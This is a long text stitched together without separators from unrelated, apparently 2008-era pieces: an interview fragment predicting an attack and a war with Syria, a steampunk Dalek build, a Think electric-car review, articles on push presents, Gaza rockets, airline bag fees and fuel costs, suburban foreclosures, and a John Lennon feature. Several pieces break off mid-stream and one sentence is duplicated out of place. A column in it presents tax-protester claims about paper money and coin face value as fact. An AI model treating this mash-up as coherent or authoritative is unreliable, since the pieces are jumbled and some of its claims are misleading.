Do you know who the M.P's are ?
[ Natalie Bracht ] : Ehm , no .
No comment .
[ Someone in the background ]
It 's right here , it 's very interesting [ Tony Gossling ] :
Thank you ,
In terms of timing , what about it , and you think it 's going to be on U.S soil in Ireland did you say ?
[ Natalie Bracht ] : Yes , in 2008 [ Tony Gossling ] :
But you pick up these rumors , but do you think it makes sense to have an attack like this now , why might they want to do it ?
[ Natalie Bracht ] :
Because they need the support , they need the mindsupport , they need the financial support , they need the strategic support , the military support .
They have already huge military support on Cyprus , I 'm talking about the Israelis , and then they will gain a bigger support for an attack that is possibly going over to the Syrian area .
I do n't expect that the next war is going to be Iran , I 'm expecting the next war to be Syria .
[ Tony Gossling ] :
What 's going to happen to the kids ?
[ Natalie Bracht ] :
Well I 'm expecting , if I should n't be successful in hiding and protecting my children , or if we do n't find any way that I 'm expecting them possibly to deliver me into a mental hospital or into prison and I will just vanish and I 'm expecting them to deliver my children into [ the state in but not of ]
Israel , provide them with different names and I will never be able to see them again .
If they do n't put me into prison or a mental hospital or whatsoever then it means that what this what the English immigration department which is obviously dealing with me even if I 'm a British citizen has put on the record about me is that they 've put me on a watchlist , and it is called tham I 'm having " communicational difficulties " .
Well what ever that means , I do n't have the impression that I have " communicational difficulties " , but I think this means something different .
So this means I can't travel to certain countries , and I will have problems to come down .
They could do this to me after they said that I was a German convert to Islam in coming into this country with different intensions , well that 's close to absurd .
So this is what I 'm expecting what will happen to my children .

Alex Holden made this stupendous steampunk *
Dalek out of junk , shampoo bottles and paint .
The main body is made from a plastic Dalek bubble - bath bottle I bought very cheaply at Woolworth 's in the post - Christmas sales .
At the time I had no idea what I could use it for , but it looked too cool to pass up .
I disassembled it and spray - painted the parts with a can of gold Plastikote paint after masking off the two silver arms on the front .
The wheels , cylinders , chimney stack , and ' bumpers ' came from a rather tacky brass model of Stephenson 's Rocket I bought for £ 5 at a car boot sale .
The brass brush on the end of the gun is the head of a rotary wire brush attachment that came with a mini - drill set .
The pressure gauge , dome , whistle , safety valve , water level gauge , and valve are all bits and pieces I had lying around the workshop ( I used to be into model engineering ) .
All the brass parts were painstakingly cleaned and polished with Scotchbrite , Autosol , and Brasso .
It is held together with a combination of screws , hot melt glue , and cyanoacrylate glue .
I left the plastic bottle inside the body because the neck acts as the turret bearing – I have n't opened it so it must still be full of bubble - bath !
Ingvil Ladehaug is battery challenged .
Her laptop is running out of juice .
Her cellphone is down to its last electrons .
But the director of communications for Norway ’s Think -- beginning production in September of perhaps the best electric car in the world -- feels good about our chances of getting home .
“ We ’re going to make it ! ” she squeals as we cross back into Oslo proper .
“ Fantastic . ”
It ’s been a long day for our adorable yellow test car .
This morning we headed for Think ’s factory in Aurskog , some 40 miles into the bluegrass Scandinavian countryside , with about an 85 % charge in the car ’s advanced sodium - cell battery .
But Ladehaug -- who is directionally challenged too -- got us turned around .
Now , after several course corrections that added perhaps 20 miles to the trip , we ’re both eyeing the battery gauge , while warning lights flash ominously .
Still the Think City -- a 2,449 - pound runabout with plastic body panels and an official range of 112 miles on full charge -- hums along .
About the size of a Mercedes - built Smart car , the two - seat Think ( backseat optional ) scoots away from stop lights , thanks to its torque - rich electric motor , and does n’t feel at all strained at highway speeds of 100 kilometers per hour ( 62 mph ) .
First impressions : dead solid , quiet , comfortable , fully realized .
A real car .
It ’s got a great look , with big moony eyes as headlamps that make you want to take it home .
The brakes are kind of touchy , the pedals are kind of small , the steering a bit leaden .
But for the most part , it feels like any other sub - compact economy car , except there ’s not an exhaust note .
Nor exhaust pipe .
When we have to make a quick change in direction -- “ Here , this turn ! ” Ladehaug shouts -- the little car darts in the direction it ’s pointed .
Think ’s journey to the world market has been similarly full of detours .
The company ( previously called Pivco ) began in 1991 and by 1998 had built more than 1,000 small and charismatic electric runabouts , sold mostly in Norway ( where you still see a few on the road ) .
Then , in 1999 , the company was bought by the Yankee giant Ford Motor Co. , which was scrambling at the time to comply with California ’s Zero Emission Vehicle mandate , essentially requiring automakers to build fleets of electric vehicles .
Ford renamed the company Think Nordic and began a complete redesign of the car .
When , in 2003 , the American automakers succeeded in modifying California ’s mandate , Detroit ’s flirtation with electronic vehicles ended .
General Motors Corp. famously killed the EV1 program , and Ford sold Think to a Swiss electronics firm .
“ The lawyers stopped us , ” says Ole Fretheim , the factory ’s manager .
Think went bankrupt in 2006 .
The irony is that Ford had already poured $ 150 million into the Think City project , engineering among other things the car ’s rigid steel space frame , the crash structure .
If and when it comes to the U.S. market -- the company opened an office in Menlo Park , Calif. , earlier this year with plans to sell cars stateside in 2009 -- the Think City will be a rarity : A full - speed electric car meeting U.S. and European crash standards .
“ The car was 95 % complete when Ford stopped development in 2002 , ” says Fretheim .
In the long run , he says , the down time might have been a good thing .
“ When we started work again we had better options for batteries . ”
In 2006 , a group of investors led by Jan-Olaf Willums , a Norwegian venture capitalist specializing in energy technology , purchased Think for $ 15 million .
Now
Think ’s chief executive , Willums has spent much of the last two years raising more money -- about $ 93 million , much of it from Silicon Valley -- to help get Think off the ground .
“ These guys are Vikings .
They ’re fearless , ” says Wilber James , a general partner of RockPort Capital Partners , which invested in Think North America along with Ray Lane of Kleiner Perkins Caufield & Byers .
“ And they ’re absolute leaders in clean technology . ”
At the factory , we ’re met by the plant director , Arne Degermosse , a 41 - year car - building veteran from Saab , brought in to ramp up production .
Also this year , Porsche Consulting came in to advise on plant efficiency .
With just under 18,000 square feet under the roof , space is at a premium ; with two shifts , says Degermosse , the facility can produce just 44 cars a day , or about 10,000 cars a year .
Not a number that will have GM shaking in its boots .
And yet , because of the unique modular assembly process -- the car is put together from a mere 580 parts -- it would be possible to set up other assembly plants closer to the markets it serves , namely Southern California .
“ It ’s called distributed manufacture , ” says James .
“ If we were going to build them anywhere in the U.S. , Southern California would have priority because that ’s where we ’d sell them .
It ’s a precursor of what the OEMs [ the big automakers ] should be doing . ”
In any electric car program , the crucial component is the battery .
Think has settled on three suppliers : MES - DEA , which produces a molten sodium battery , and A123Systems and EnerDel , which produce varieties of lithium - ion batteries .
The MES - DEA battery yields 28 kilowatt - hours , while the EnerDel and the A123Systems batteries produce 26 and 19 kWh , respectively .
Any of the three are expensive .
At current market prices , Think ’s City could cost up to $ 35,000 , more than half of that tied up in the battery .
For that reason , Willums proposes to sell the cars for $ 20,000 - $ 25,000 and lease the batteries to owners , for a $ 150 to $ 200 monthly “ mobility fee . ”
All battery maintenance and replacement costs would be covered , and there could be ways to compensate owners for the costs of the electricity to charge the cars .
“ The real interesting part is what is going to happen next , ” says James .
“ The market has evolved faster than we ever thought . ”
Think currently does n’t know how it will sell the car :
Will there be online showrooms or real showrooms ?
Or will customers go to their local
Think assembly plants and watch as their cars are built ?
What tax breaks will be available , and from whom ?
Will consumers balk at a rental fee on top of a purchase price ?
All these questions remain unanswered .
But as for the question so often asked :
Is a safe , practical electric car possible ?
The answer seems to be yes .

That ’s “ push ” as in , “ I the mother , having been through the wringer and pushed out this blessed event , hereby claim my reward . ”
Or “ push ” as in , “ I ’ve delivered something special and now I ’m pushing you , my husband / boyfriend , to follow suit . ”
“ It ’s more and more an expectation of moms these days that they deserve something for bearing the burden for nine months , getting sick , ruining their body , ” said Linda Murray , executive editor of BabyCenter.com .
“ The guilt really gets piled on . ”
A recent survey of more than 30,000 respondents by BabyCenter.com found that 38 percent of new mothers received a gift from their mate in connection with their child .
Among pregnant mothers , 55 percent wanted one .
About 40 percent of both groups said the baby was ample reward .
Sandra Miller of Arlington , Mass. , is not among the 40 percent .
“ Women can and do expect a thoughtful token of appreciation , ” she said .
“ It ’s a way to honor a mother giving her emotions , body and hormones over to a baby for nine months , culminating in an experience which , when done naturally , redefines the meaning of pain .
And when not done naturally , it ’s still an act of sacrifice . ”
Push presents seem to have taken off within the last decade , particularly in the last couple of years .
In 2005 the Southeast - based jewelry chain Mayors marketed diamond earrings with the tag line , “ She delivered your first born ; now give her twins . ”
Fortunoff , the jewelry and gift chain with a Fifth Avenue flagship , established a push present registry six months ago .

SILVER , GOLD AND THE IRS By Derry Brownfield
June 15 , 2008 NewsWithViews.com
I began a recent presentation before a large group of cattle producers ( R - CALFUSA ) by showing a paper dollar bill and a silver coin .
The words “ one dollar ” is inscribed on both the coin and the paper , yet the paper dollar will only pay for about one quart of gasoline at today ’s prices , while the silver dollar will pay for well over five gallons .
I explained to my audience that consumer prices are not high – the paper dollar has lost most of its value .
It makes no difference how high the price of gasoline goes , a silver dollar will continue to buy gas for 20 cents a gallon , exactly the price gas was during the Great Depression .
Based on 1940 prices , a paper dollar is worth about two pennies .
Today in America , we are being systematically robbed of our property because we have allowed the Federal Reserve to flood our banks with fiat , worthless paper money .
There is actually a law against paper money but nobody seems to know about it .
The Supreme law of the land is the US Constitution , which stated in Article I Section 10 : Individual states are “ not allowed to make any things but gold and silver coin a tender in payment of debts . ”
The Constitution also states that “ Congress has the power to COIN money and regulate the value thereof . ”
Our Founding
Fathers knew how a central bank printing paper money would collapse our economy .
Had we followed the US Constitution to the full letter of the law , gasoline would still be 20 cents a gallon .
As the dollar continues to lose value we say our currency has lost its purchasing power .
It should be more properly referred to as embezzlement by the banking industry .
Robert Kahre owns a family business and instead of using paper money he paid his workers with gold and silver coins minted by the United States government .
He paid them based on the “ face value ” of the coins .
If he paid a worker a dollar an hour he paid with a silver dollar , which states on the coin that it is “ one dollar ” regardless of today ’s value .
His wages were so low that he did n’t have to file W - 2 income tax forms or withhold taxes or pay workman ’s comp .
This upset the IRS , which charged him and his family with 161 federal tax crimes .
The case which was tried before a Las Vegas jury in a Federal Court , heard testimony for almost four months .
Defendants believed they had no legal obligation to withhold , pay income taxes or report anything to the government because the “ face value ” of the gold and silver coins is so small as to fall beneath the reporting thresholds set by the Internal Revenue Code .
The government argued that the payments in gold and silver US coins must be considered at their bullion , full - market value when considering the worth of the wages for purposes of the IRS code .
The essence of the argument is that Congress is obligated by law to mint and circulate such coins as demand requires , and must establish the value of coins as they are used as legal tender , but a coin ’s market value is a distinct , separate attribute of such coins and is of no legal consequence if the coins are used as legal tender .
If a worker is paid with such coins , his taxable income can only be the face value indicated on the coin .
“ A coin dollar is worth no more for the purposes of tender in payment of an ordinary debt than a note dollar .
The law has not made the note a standard of value anymore than coin .
It is true that in the market , as an article of merchandise , one is of greater value than the other ; but as money , as a medium of exchange , the law knows no difference between them . ”
On September 17 , the jury returned its verdict refusing to convict all nine defendants of any of the 161 federal tax crimes they had been charged with .
One would think , “ we the tax payers would want to hear that the IRS was defeated by the use of the true money . ”
To my knowledge , the results of this trial were never printed or broadcast by any of the major news media .
Three days after the trial ’s conclusion , the Las Vegas Review Journal ran its first and last story about the outcome and then only because of public pressure from interested parties who attended the trial .

Today in America , we are being systematically robbed of our property because we have allowed the Federal Reserve to flood our banks with fiat , worthless paper money .
( Adds more arrests of rocket squad members , paragraphs 1 , 3 )
GAZA , July 10 ( Reuters ) - Hamas arrested seven Palestinians who fired rockets into Israel from the Gaza Strip on Thursday , a militant faction said , in the first such detentions since the Islamist group and Israel agreed a truce last month .
Al - Aqsa Martyrs Brigades , a group linked to President Mahmoud Abbas 's Fatah group , said Hamas men pursued three of its its members after the attack and " abducted them " in Jabalya refugee camp .
No one was hurt in the strike with two rockets on southern Israel .
Four more men were arrested as they tried to fire rockets at Israel after darkness fell , an al - Aqsa official said .
" We demand their immediate release , " said Abu Qusai , a brigades spokesman .
Hamas official Sami Abu Zuhri said : " We stress that all parties should maintain the national agreement that was reached with a consensus . "
Hamas , which seized control of the Gaza Strip a year ago after routing forces loyal to the secular Fatah group , had previously said it would not use force against other militants who violate the truce .
Al - Aqsa said it launched the rockets in retaliation for the Israeli army 's killing of an unarmed member of the group as he tried to cross a border fence into Israel earlier in the day .
His death marked the first fatality along the Israel - Gaza border since the June 19 Egyptian - brokered ceasefire .
An Israeli army spokesman said soldiers shot the man after he ignored their calls to stop and only saw later that he had been unarmed .
NABLUS VISIT
The ceasefire deal calls on Hamas to prevent cross - border rocket fire and attacks from the Gaza Strip , and for Israel to halt its raids and ease an economic blockade .
" If a total cessation of fire from Gaza , as committed in the calm , is not implemented , the calm has no possibility to succeed , " Israeli Prime Minister Ehud Olmert 's spokesman , Mark Regev , said .
Israel tightened restrictions on the passage of people and goods to and from the impoverished territory after Hamas 's takeover .
U.N. officials said Gaza 's goods crossings were still shut often despite the truce .
" There is not enough fuel , not enough food , there is not enough of anything , " John Ging , an official with the U.N. Relief and Works Agency ( UNRWA ) that aids refugees , said in Gaza .
Although Israel has responded to cross - border rocket fire by frequently shutting Gaza 's crossings , records compiled by Western officials show up to a 44 percent increase in goods imports in recent weeks , including a 30 percent rise in fuel .
In the occupied West Bank , Palestinian Prime Minister Salam Fayyad visited Nablus , where Israeli troops had raided several charity groups and a medical clinic and closed down a television station .
Israel has raided 15 Nablus charities suspected of being linked to Hamas .
Speaking to shop owners inside a mall Israel ordered closed , Fayyad said : " It should be known clearly that the Israeli army orders and decisions are not valid and do n't have any basis .
We will deal with them as if they do n't exist . "
" Shopkeepers are invited to open their stores and ignore the Israeli decision , " he added .
Senior Hamas leader Ismail Haniyeh accused Palestinian Authority officials of backing the Israeli operations .

A few things have unsettled me these past couple of weeks about the Obama campaign .
It is not the small adjustments to previously - held positions - FISA , the Second Amendment , Iraq .
It 's a sense that Obama 's ample self - regard is lapsing into hubris .
The signs of this are pretty trivial on the surface , but they are troubling nonetheless .
That simulated faux - presidential seal was both tacky , silly and presumptive - a small version of " Mission Accomplished " Obama could well do without .
The decision to give his acceptance speech in a stadium , rather than the traditional convention hall is also an unnecessary over - reach .
The night will be freighted enough with history ; it needs no new drama to set it apart .
And the drama of the first black man accepting the nomination - with Obama 's rhetorical brilliance - will be more than enough for impact .
Lastly , I was gob - smacked by the Obamas ' decision to include their children in a soft - focus TV interview .
I can barely credit that Michelle Obama agreed to this and that Barack Obama went along with it - it's not what they would have done a few months ago .
One great aspect of the Obama marriage has been the way in which they appear to have brought up their daughters as very regular girls , down - to - earth , normal and sane .
Displaying them in this way was bad judgment and poor parenting .
Fame is a toxin .
Children deserve to be protected from it as much as they would from lead paint .
Any one of these misjudgments would be a trivial lapse - and we all make mistakes .
It 's the combination that concerns me - and the possibility that this campaign is becoming far too cocky for its own good .

Checked Bag Fees : Money for Nothing Passengers pay to check bags , but it does n't mean the luggage wo n't be lost .
May 22 , 2008  --
Heading to the airport this holiday weekend ?
Well , if you 're planning to check bags you 'd better bring some extra cash .
American Airlines announced Wednesday that it will start charging passengers $ 15 next month to check a bag .
The airline -- like many others -- had already announced plans to charge $ 25 to check a second bag .
But just because these airlines are charging you for what was once free , do n't expect any improvements in service .
Airline experts said there will still be plenty of lost bags .
Ray Neidl , an airline analyst with Calyon Securities , said because of high gas prices the airlines need cash and passengers should n't expect any change in how their bags are handled .

" The systems are still going to be the same , " Neidl said .
Basically , he added , fuel prices are forcing the airlines to do something they might have done anyway .
" People want bare - bones ticket prices .
They do n't want to be subsidizing other passengers checking in bags , " Neidl said .
Rick Seaney , CEO of FareCompare.com and an ABCNEWS.com columnist , also cast doubt about any improved baggage service .
" Sure they 'll charge $ 15 to check a bag , but if you think this will get your bag to your final destination … in your dreams , " Seaney said .
" I doubt this new $ 15 first check bag fee is going to come with a money - back guarantee if / when your bag does n't make it to your destination . "
Robert Crandall , former CEO of American Airlines , said today on " Good Morning America " that the new fee is " a reflection of the desperation of the industry . "
He noted that baggage " weighs a good deal " and therefore burns a lot of costly fuel .
But he said his former company 's move might not have been the best approach .
" I think frankly the industry might be better off if it raised fares and had everybody contribute , " Crandall said .
But in the past when airlines have raised fares there have been times when one refused to go along with the hike , he said , undermining others .
Crandall also said that more government regulation of the airlines might solve some of the industry 's perils .
Struggling With the Economy ?
What can ABC News do or tell you that would help you live your life ?
It is not clear whether other airlines will follow American 's lead .
Delta released a statement Wednesday saying : " Though record - breaking fuel prices are causing us to look at costs in every area of our business , we have no plans at this time to charge for a first checked bag . "
Other airlines took a similar wait - and - see approach .
Air Canada , American , Continental , Delta , Northwest , United , US Airways and Virgin America are all charging $ 25 for that second bag , according to SmarterTravel.com , which tracks such fees .
JetBlue charges $ 20 and AirTran $ 10 for that second bag .
Southwest charges $ 25 for a third checked bag .
Spirit charges for all bags checked -- $ 10 for the first and $ 20 for the second if paid in advance online .
Otherwise , Spirit charges $ 20 at the airport for both bags .
All airlines charge more for additional bags .
Struggling with the Economy ?
What can ABC News do or tell you that would help you live your life ?
Robert Mann , an airline industry analyst and consultant based in Port Washington , N.Y. , said it is highly unlikely that any of these new fees will improve baggage handling .
" I do n't think there 's any transparency on that end .
I suspect the answer is no , " Mann said .
" I think these are just to defray existing costs of operating and maintaining the baggage systems that are in place today . "
Some passengers have half - jokingly suggested that airlines will next start charging to use the bathroom .
OK , so that might -- we hope -- be a stretch , but what 's next ?
" We 're going down the path of pricing like air freight -- by the pound , " Mann said .
No U.S. airline currently charges by weight , except when bags exceed their weight limits , but Mann sees that as the next trend .
" We 're treated like freight anyway , " he said .
" It 's becoming a self - service industry .
You 're forced to do everything yourself or you pay for human interaction . "
Mann said the new baggage fees are going to make the situation on planes before take - off more difficult .
" It will create an incredible amount of gaming by customers who will try to carry ever - larger articles on aircraft to avoid the fees , " he said .
" It puts flight attendants into the role of monitors as to what and how many articles can go on board an aircraft . "
What is still unclear , Mann said , is what will happen when the overhead bins fill up and people have to check their bags at the gate .
" Are they assessed the $ 15 or $ 25 fee ? " he asked .
While the airlines do n't appear to be doing much with baggage -- except charging more -- one U.S. airport is investing money to make sure fewer bags get lost .
McCarran International Airport in Las Vegas has more passengers starting or ending their trip there than any other airport in the country except Los Angeles International Airport .
That means a lot of bags go through its system .
Airport officials say their facility handles 70,000 to 75,000 outbound bags a day .
Some of those are bound to get lost .
But since the airport started a new radio frequency tagging system in September 2005 , it has tracked bags with much greater accuracy .
Traditionally , when a passenger checks a bag , the airlines print a tag with the person 's name , flight number , connecting airport and final destination .
The tags have bar codes that can be read by scanners -- similar to those at the supermarket -- and also say in big letters the three - letter code for the destination : i.e. , MCO for Orlando or DFW for Dallas - Fort Worth .
Passengers flying out of Las Vegas still get those tags with the bar codes , but their tags also have a little chip in them with a unique identifier .
Using radio waves , those chips and the baggage equipment talk to each other , smoothing a bag 's trip through the system .
With its old system , the Last Vegas airport found that it needed to have workers manually help 10 percent of the bags through the system .
Now , virtually no bags need help .
The airport paid for the system and is picking up the tab for the added cost of the special tags .
Each regular baggage tag costs about 4 cents but the tags with chips cost about 21 cents each .
That does n't mean there are n't issues .
The radio chip tracking system only works for the part of the system controlled by the airport -- basically the security scans .
Once the bags are sorted to the different airlines , the airlines revert to the old bar code system .
None of the airlines have invested money in such a tracking system yet .
Rosemary Vassiliadis , deputy director of the Clark County Department of Aviation , which owns and runs the airport , said in a statement that the airport is very happy with the system .
Bags now make it through the system " with better than 99 percent accuracy . "
" As a discretionary travel market , we can't afford to see our customers leave Las Vegas with a bad impression of our airport , " Vassiliadis said .
This new system " wo n't solve every problem , but it 's certainly played a part in allowing this airport to operate efficiently , " she said , " and it 's got the potential to do even more once it 's rolled out [ on ] a wider basis . "

Report : Sony Prepping Wii-like ' Break Apart ' Pad
According to unspecified sources , working units have been delivered to development partners , although it 's not clear when the pad will be officially unveiled .
As expected , Sony Computer Entertainment declined to comment .
A differing report at Kotaku , however , suggests that the control system consists of a small device that attaches in the body .
Multiple devices can be worn , such as two on the hands to move a character 's hands in - game or four on the hands and feet .
Kotaku 's source disputed the notion that the pieces would merge into a single controller .
At present , the PlayStation 3's Sixaxis controller allows for basic motion - sensing functionality , though not quite as articulated as what 's offered by Nintendo 's Wii Remote and nunchuck controller combo .
The runaway success of Nintendo's Wii console has led many to speculate as to its competitors plans to break into the motion - sensing sphere of gaming .
Last April , rumors circulated of a Wii Remote - like peripheral for Microsoft 's Xbox 360 , codenamed Newton , reportedly aimed for debut the following month .
No official announcements for Newton materialized at Microsoft 's product showcases .
Should Microsoft or Sony indeed be working on controllers or peripherals to counter the Wii , those products — such as the above - mentioned PS3 " break apart " pad — will likely be unveiled at this year 's E3 Media and Business Summit .
( CNN ) --
When Shaun Yandell proposed to his longtime girlfriend Gina Marasco on the doorstep of their new home in the sunny suburb of Elk Grove , California , four years ago , he never imagined things would get this bad .
But they did , and it happened almost overnight .
Suburban neighborhoods are becoming refuges for those outpriced in gentrifying inner-cities .
" It is going to be heartbreak , " Yandell told CNN .
" But we are hanging on . "
Yandell 's marriage is n't falling apart : his neighborhood is .
Devastated by the subprime mortgage crisis , hundreds of homes have been foreclosed and thousands of residents have been forced to move , leaving in their wake a not - so - pleasant path of empty houses , unkempt lawns , vacant strip malls , graffiti - sprayed desolate sidewalks and even increased crime .
In Elk Grove , some homeowners not only cut their own grass but also trim the yards of vacant homes on their streets , hoping to deter gangs and criminals from moving in .
Other residents discovered that with some of the empty houses , it was n't what was growing outside that was the problem .
Susan McDonald , president of a local neighborhood association aimed at saving the lost suburban paradise , told CNN that around her cul - de-sac , federal agents recently busted several pot homes with vast crops of marijuana growing from floor to ceiling .
And only a couple of weeks ago , Yandell said he overheard a group of teenagers gathered on the street outside his back patio , talking about a robbery they had just committed .
When they lit a street sign on fire , Yandell called the cops .
" This is not like a rare thing anymore , " he said .
" I get big congregations of people cussing -- stuff I can't even fathom doing when I was a kid . "
For Yandell , his wife and many other residents trying to stick it out , the white picket fence of an American dream has faded into a seemingly hopeless suburban nightmare .
" The forecast is gloomy , " he told CNN .
While the foreclosure epidemic has left communities across the United States overrun with unoccupied houses and overgrown grass , underneath the chaos another trend is quietly emerging that , over the next several decades , could change the face of suburban American life as we know it .
This trend , according to Christopher Leinberger , an urban planning professor at the University of Michigan and visiting fellow at the Brookings Institution , stems not only from changing demographics but also from a major shift in the way an increasing number of Americans -- especially younger generations -- want to live and work .
" The American dream is absolutely changing , " he told CNN .
This change can be witnessed in places like Atlanta , Georgia , Detroit , Michigan , and Dallas , Texas , said Leinberger , where once rundown downtowns are being revitalized by well - educated , young professionals who have no desire to live in a detached single family home typical of a suburbia where life is often centered around long commutes and cars .
Instead , they are looking for what Leinberger calls " walkable urbanism " -- both small communities and big cities characterized by efficient mass transit systems and high density developments enabling residents to walk virtually everywhere for everything -- from home to work to restaurants to movie theaters .
The so - called New Urbanism movement emerged in the mid-90s and has been steadily gaining momentum , especially with rising energy costs , environmental concerns and health problems associated with what Leinberger calls " drivable suburbanism " -- a low - density built environment plan that emerged around the end of the World War II and has been the dominant design in the U.S. ever since .
Thirty - five percent of the nation 's wealth , according to Leinberger , has been invested in constructing this drivable suburban landscape .
But now , Leinberger told CNN , it appears the pendulum is beginning to swing back in favor of the type of walkable community that existed long before the advent of the once fashionable suburbs in the 1940s .
He says it is being driven by generations molded by television shows like " Seinfeld " and " Friends , " where city life is shown as being cool again -- a thing to flock to , rather than flee .
" The image of the city was once something to be left behind , " said Leinberger .
Changing demographics are also fueling new demands as the number of households with children continues to decline .
By the end of the next decade , the number of single - person households in the United States will almost equal those with kids , Leinberger said .
And aging baby boomers are looking for a more urban lifestyle as they downsize from large homes in the suburbs to more compact town houses in more densely built locations .
Recent market research indicates that up to 40 percent of households surveyed in selected metropolitan areas want to live in walkable urban areas , said Leinberger .
The desire is also substantiated by real estate prices for urban residential space , which are 40 to 200 percent higher than in traditional suburban neighborhoods -- this price variation can be found both in cities and small communities equipped with walkable infrastructure , he said .
The result is an oversupply of depreciating suburban housing and a pent - up demand for walkable urban space , which is unlikely to be met for a number of years .
That 's mainly , according to Leinberger , because the built environment changes very slowly ; and also because governmental policies and zoning laws are largely prohibitive to the construction of complicated high - density developments .
But as the market catches up to the demand for more mixed use communities , the United States could see a notable structural transformation in the way its population lives -- Arthur C. Nelson , director of Virginia Tech 's Metropolitan Institute , estimates , for example , that half of the real - estate development built by 2025 will not have existed in 2000 .
Yet Nelson also estimates that in 2025 there will be a surplus of 22 million large - lot homes that will not be left vacant in a suburban wasteland but instead occupied by lower classes who have been driven out of their once affordable inner-city apartments and houses .
The so - called McMansion , he said , will become the new multi-family home for the poor .
" What is going to happen is lower and lower - middle income families squeezed out of downtown and glamorous suburban locations are going to be pushed economically into these McMansions at the suburban fringe , " said Nelson .
" There will probably be 10 people living in one house . "
In Shaun Yandell 's neighborhood , this has already started to happen .
Houses once filled with single families are now rented out by low - income tenants .
Yandell speculates that they 're coming from nearby Sacramento , where the downtown is undergoing substantial gentrification , or perhaps from some other area where prices have gotten too high .
He is n't really sure .
But one thing Yandell is sure about is that he is n't going to leave his sunny suburban neighborhood unless he has to , and if that happens , he says he would only want to move to another one just like it .
" It 's the American dream , you know , " he said .
" The American dream . "

CHICAGO ( Reuters ) -
As expensive and uncomfortable as air travel may be for passengers , the pain is worse for airlines , as fuel costs approach 40 percent of a ticket price -- even after two years of fare hikes .

It ’s getting tough for carriers struggling to run the leanest possible operations to persuade people to pay more money for their cramped , crowded and frequently delayed flights .
“ This situation -- skyrocketing fuel costs -- has gone from a serious cost problem a year ago into one that is going to completely torpedo the way airlines do business , ” said Michael Boyd , airline consultant at The Boyd Group .
Despite their best efforts to raise fares , the airline industry is being mauled as the price of crude oil notches record after record above $ 130 a barrel .
The Air Transport Association , the main lobby group for big airlines , said this week the portion of a ticket needed to pay for fuel is nearly 40 percent , compared with 15 percent in 2000 .
This massive increase threatens to undo the progress made in 2006 and 2007 , when the industry began to recover from the downturn that began in 2001 .
After the September 11 attacks , terror concerns , economic weakness and low - fare competition pressured fares and tipped four major airlines -- UAL Corp 's UAUA .
O United Airlines , US Airways Group LCC.N , Delta Air Lines Inc DAL.N and Northwest Airlines Corp NWA.N -- into bankruptcy .
Now , as airlines face another downturn , aggravated by high fuel prices , top carriers are slashing capacity and cutting staff in the hope of cutting costs so they can survive .
United Airlines said this month it would cut its mainline domestic capacity by up to 18 percent .
AMR Corp's AMR.N American Airlines said it would trim domestic capacity by up to 12 percent in the fourth quarter .
Continental Airlines Inc CAL.N and US Airways also announced major cuts .
“ The industry needs to act decisively and responsibly to size our businesses appropriately to reflect the changing market reality , ” United ’s Chief Executive Glenn Tilton said on Thursday at the company ’s annual shareholder meeting .
At current fuel prices , the carrier ’s projected 2008 fuel bill would be $ 9.5 billion , up $ 3.5 billion from 2007 , Tilton said , demonstrating the scale of the problem .
Despite a near - two - year string of industry - wide fare increases -- 13 in 2008 so far , according to FareCompare.com -- fares have yet to fully rebound from years of decline , accelerated by aggressive low - cost airlines like Southwest Airlines Co LUV.N and JetBlue Airways Corp JBLU.O .
Research provided by The Boyd Group shows the average price for a domestic ticket in 2007 was $ 181.91 , compared with $ 188.16 in 2000 -- when the price of a barrel of oil was about $ 100 less than it is today .
Nowadays , airlines devote $ 74.03 of the average ticket price to jet fuel , compared with just $ 31.77 in 2000 , Boyd said .
With this unprecedented burden on the airlines , management is combing operations for new revenue sources .
For example , carriers now charge for meals and snacks that once were complimentary as well as for preferred seating in coach cabins .
Earlier this year , major airlines began charging customers to check a second bag , a move that drew the ire of passengers .
In May , American Airlines took the next controversial step , saying it would charge passengers $ 15 to check just one bag .
That new fee , which outraged some travelers , was matched on Thursday by United Airlines and US Airways .
Experts predict others will adopt the fee too .
“ The economic rules of our industry have changed substantially and we simply can’t keep running the same plays , ” US Airways CEO Doug Parker said on Thursday in a message to employees .
What exactly do John McCain and Barack Obama know about science ?
That 's what the folks behind Science Debate 2008 want to know , and to find out , they 've developed 14 questions they sent to the candidates and hope to discuss with them at a science - only debate .
The questions cover innovation , climate change , energy , genetics , space , and health , among other topics .
This marks the second effort by the group to get presidential candidates to address scientific issues .
In April , the group actually set a date for a debate in Philadelphia , but the event never materialized .
Given the nature of presidential politics and the meatiness of the questions , we'd be happy if the candidates answered even one of them with more than a platitude .
We 're also curious if you feel any major areas were left unaddressed .
Personally , I think the energy question is a little too watered down for my taste .
In any case , check out the full list of questions after the jump .

JUST LIKE STARTING OVER : THE RECORDING OF DOUBLE FANTASY
FIRST PUBLISHED : Uncut Legends , December 2005
By Chris Hunt John Lennon felt really alive .
For the first time since those distant days as a leathered - up rock ’n’roller in the bierkellers of Hamburg , he felt that his destiny was in his own hands .
Alone at the helm as 20 - foot waves crashed down on the bow , he gripped tightly to the wheel , carving a path for his vessel through the squall with just a yellow Sowester for protection , screaming seas shanties in the face of the tempest .
He had locked himself away in the Dakota for five years , watching TV , reading books , ringing - up late - night radio phone - in shows , bringing up his son , baking bread , and above all avoiding most forms of confrontation and danger .
Now , with the rain lashing his face and tears streaming down his cheeks , John felt a different man .
At the helm of the Megan Jaye , a 43 - foot sloop bound for Bermuda , he knew that he was fighting for survival against elements more powerful than himself , a force of nature infinitely more potent than the Beatle machine that had drained away the control he once exercised over his own life – and he felt the rush of blood all the more keenly , the surge of adrenaline in a way that he had forgotten possible .
Here was a man in the process of rediscovering that life was for living .
From this point on , for John it would be just like starting over !
In May 1980 John Lennon had been a man seeking adventure .
Having been dispatched to his recently acquired summer home in Cold Spring Harbor on Long Island ’s north shore , as far as Yoko was concerned he was out of sight and out of mind .
Away from the watchful eyes of ‘ Mother ’ and her helpers at the Dakota , who provided a regime of round - the - clock policing that could save him from his own more cavalier gut instincts , John set in motion a plan to fulfil what he claimed to be a lifelong ambition .
He wanted to learn how to sail .
“ All my life I ’ve been dreaming of having my own boat , ” he confided that summer , embroidering this desire with tales of haunting the Liverpool docks as a child , wistfully following the boats with a longing stare as he wondered whether each vessel might be the craft carrying his errant father out to sea .
This nautical fascination had developed with age .
The househusband of the Dakota was an avid reader , with plenty of time to ponder the possibility of a Viking ancestry .
He devoured books on the subject , on Eric The Red and Thor Heyerdahl ’s ‘ Early Man And The Ocean ’ , and meekly confessed to violent seafaring fantasies , where John the fearless Viking would rape and pillage at will .
